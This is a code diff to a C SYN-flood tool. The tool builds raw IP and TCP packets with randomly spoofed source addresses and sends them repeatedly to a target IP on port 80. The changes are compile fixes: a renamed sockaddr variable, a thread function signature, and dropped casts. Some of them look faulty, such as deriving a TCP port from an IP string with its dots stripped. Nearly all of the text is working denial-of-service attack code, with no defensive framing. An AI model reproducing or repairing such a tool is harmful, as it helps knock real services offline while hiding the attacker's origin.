@@ -31,7 +31,7 @@ char source_ip[32];
 char *data;
 struct iphdr *iph;
 struct tcphdr *tcph;
-struct sockaddr_in sin;
+struct sockaddr_in s_in;
 struct pseudo_header psh;
 int psize;
 int one = 1;
@@ -43,7 +43,7 @@ void handle_signal(int sig);
 void remove_char(char *string, char garbage);
 int random_int(int min, int max);
 void random_ip(char *string);
-void *syn_flood();
+void *syn_flood(void *data);
 
 int main(int argc, char *argv[])
 {
@@ -103,9 +103,9 @@ void *syn_flood(void *data)
   {
     // address resolution
     random_ip(source_ip); // spoofed IP address - ex: 192.168.1.2
-    sin.sin_family = AF_INET;
-    sin.sin_port = htons(80); // port
-    sin.sin_addr.s_addr = inet_addr(target_ip); // target IP
+    s_in.sin_family = AF_INET;
+    s_in.sin_port = htons(80); // port
+    s_in.sin_addr.s_addr = inet_addr(target_ip); // target IP
 
     // IP header
     iph->ihl = 5;
@@ -118,14 +118,14 @@ void *syn_flood(void *data)
     iph->protocol = IPPROTO_TCP;
     iph->check = 0;
     iph->saddr = inet_addr(source_ip); // source ip address
-    iph->daddr = sin.sin_addr.s_addr;  // destination ip address
+    iph->daddr = s_in.sin_addr.s_addr;  // destination ip address
 
     // IP checksum
-    iph->check = csum((unsigned short *)datagram, iph->tot_len);
+    iph->check = csum(datagram, iph->tot_len);
 
     // TCP header
     remove_char(source_ip,'.');
-    tcph->source = htons(source_ip);
+    tcph->source = htons(atoi(source_ip));
     tcph->dest = htons(80);
     tcph->seq = 0;
     tcph->ack_seq = 0;
@@ -142,7 +142,7 @@ void *syn_flood(void *data)
 
     // TCP checksum
     psh.source_address = inet_addr(source_ip);
-    psh.destination_address = sin.sin_addr.s_addr;
+    psh.destination_address = s_in.sin_addr.s_addr;
     psh.placeholder = 0;
     psh.protocol = IPPROTO_TCP;
     psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));
@@ -153,7 +153,7 @@ void *syn_flood(void *data)
     memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
     memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + strlen(data));
 
-    tcph->check = csum((unsigned short *)pseudogram, psize);
+    tcph->check = csum(pseudogram, psize);
 
     // IP_HDRINCL to tell the kernel that headers are included in the packet
     if (setsockopt(raw_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
@@ -164,7 +164,7 @@ void *syn_flood(void *data)
     }
 
     // Send the packet
-    if (sendto(raw_socket, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
+    if (sendto(raw_socket, datagram, iph->tot_len, 0, (struct sockaddr *)&s_in, sizeof(s_in)) < 0)
     {
       perror("sendto failed");
       printf("Error code: %d\n", errno);
